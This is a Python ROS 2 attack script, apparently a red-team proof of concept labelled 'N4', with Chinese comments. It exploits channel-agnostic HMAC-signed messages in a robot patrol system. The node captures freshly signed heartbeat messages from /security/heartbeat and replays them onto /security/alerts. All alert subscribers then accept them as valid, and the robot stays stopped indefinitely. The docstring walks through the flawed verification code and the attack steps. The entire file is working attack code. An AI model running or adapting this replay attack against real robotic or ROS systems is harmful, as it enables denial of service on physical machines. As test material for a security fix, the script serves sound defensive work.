#!/usr/bin/env python3
"""攻擊 N4 — Cross-channel signature confusion (HMAC envelope fungibility).

N1/N3 修補加了 ts + nonce + ReplayCache，但漏一個關鍵欄位：**topic / channel name**。
所有 channel（/security/alerts, /security/heartbeat, /patrol/goto）共用同一個
sign_alert envelope，sender 沒在 body 寫「我是哪個 channel」，receiver 也沒驗。

漏洞鏈：

    monitor._publish_heartbeat:
        payload = f'hb|{time.time():.3f}'
        msg.data = sign_alert(payload, secret)   ← envelope 不含 "channel" 欄位
        heartbeat_pub.publish(msg)

    patrol._cb_alert:
        payload = verify_alert(msg.data, secret, cache=self._alert_replay_cache)
        #                                              ↑↑↑ 跟 IDS 的 hb_cache 各自獨立
        if payload is None: return
        if not self._paused:
            self._pub(0, 0)               # ★ 不管 payload 是什麼都停車
            self._paused = True

攻擊步驟（不需要 secret，攻擊者能力 L1）：
    1. 訂閱 /security/heartbeat（RELIABLE+TRANSIENT_LOCAL → late-join 也能拿）
    2. monitor 每 2s publish 新心跳 → 攻擊者每次取走 fresh signed bytes
    3. 把同一筆 bytes publish 到 /security/alerts
    4. patrol/mission/system_status/burger_env 的 alert cache 都是「初次見到」
       這個 nonce → 通過驗章 → 立刻 paused，30s resume timer 啟動
    5. 每 2 秒重複 → resume timer 永遠被重置 → 永久停車

優勢相對 N3：
    - N3 需要先觸發一筆 legit alert 才能 capture（噪音大）
    - N4 用 monitor 自動每 2s 發的 heartbeat → 永遠有 fresh signed bytes 可用

對所有 alert subscriber 通用（patrol_node / burger_sac_env / mission_manager /
system_status_node 都中招），因為 HMAC envelope 是 channel-agnostic 的。
"""
import sys
import time
import rclpy
from rclpy.node import Node
from rclpy.qos import (DurabilityPolicy, QoSProfile, ReliabilityPolicy)
from std_msgs.msg import String


class ChannelConfusionAttacker(Node):

    def __init__(self):
        super().__init__('attacker_channel_confusion')
        # Subscribe to /security/heartbeat — monitor 用 RELIABLE+TRANSIENT_LOCAL
        qos_hb = QoSProfile(
            depth=1,
            reliability=ReliabilityPolicy.RELIABLE,
            durability=DurabilityPolicy.TRANSIENT_LOCAL,
        )
        # Publish to /security/alerts — monitor 用 RELIABLE+TRANSIENT_LOCAL
        qos_alert = QoSProfile(
            depth=10,
            reliability=ReliabilityPolicy.RELIABLE,
            durability=DurabilityPolicy.TRANSIENT_LOCAL,
        )

        self._injection_count = 0

        # Subscription-driven：一收到 fresh heartbeat 立刻 forward 到 /security/alerts
        # 每筆都是新 nonce + ts 剛被簽（< 1ms） → patrol 的 ReplayCache 100% 接受
        self._hb_sub = self.create_subscription(
            String, '/security/heartbeat', self._on_hb, qos_hb,
        )
        self._alert_pub = self.create_publisher(
            String, '/security/alerts', qos_alert,
        )

        self.get_logger().warn(
            '🎯 監聽 /security/heartbeat — 一收到立刻 forward 到 /security/alerts'
        )

    def _on_hb(self, msg: String):
        # 把 monitor 簽好的 heartbeat envelope 原封不動丟到 alerts channel
        # sign_alert envelope 不綁 topic → patrol 用 alert_cache 驗章必過
        m = String()
        m.data = msg.data
        self._alert_pub.publish(m)
        self._injection_count += 1
        if self._injection_count <= 3 or self._injection_count % 3 == 0:
            self.get_logger().error(
                f'💀 注入 #{self._injection_count}: fresh hb bytes → /security/alerts'
            )


def main():
    rclpy.init()
    node = ChannelConfusionAttacker()
    duration = float(sys.argv[1]) if len(sys.argv) > 1 else 45.0
    deadline = time.monotonic() + duration
    try:
        while rclpy.ok() and time.monotonic() < deadline:
            rclpy.spin_once(node, timeout_sec=0.5)
    finally:
        node.get_logger().error(
            f'⏹ 結束，總共 {node._injection_count} 次 cross-channel 注入'
        )
        node.destroy_node()
        rclpy.shutdown()


if __name__ == '__main__':
    main()
